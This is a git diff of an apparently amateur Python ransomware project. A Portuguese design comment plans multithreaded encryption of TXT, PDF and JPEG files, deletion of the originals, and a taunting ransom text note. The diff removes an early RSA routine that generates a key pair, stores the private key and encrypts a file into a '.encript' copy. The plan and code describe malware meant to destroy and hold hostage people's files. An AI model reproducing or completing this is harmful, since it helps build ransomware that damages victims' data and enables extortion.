@@ -7,31 +7,5 @@ from Crypto import Random
     MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
     MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
     IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
-    
+    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU
 '''
-
-chave=RSA.generate(2048)
-chave_privada=chave.exportKey('DER')
-chave_publica=chave.publickey().exportKey('DER')
-f=open('chave_privada.txt','wb')
-f.write(chave_privada)
-f.close()
-#f=open('chave_publica.txt','wb')
-#f.write(chave_publica)
-#f.close()
-
-obj_chave_publica=RSA.importKey(chave_publica)
-
-arquivo='requeriments.txt'
-novo_arquivo='requeriments.txt.encript'
-
-# leu o arquivo
-f=open(arquivo,'rb')
-conteudo=f.read()
-f.close()
-
-# criou novo arquivo
-f=open(novo_arquivo,'wb')
-enc = obj_chave_publica.encrypt(conteudo,'x')[0]
-f.write(enc)
-f.close()
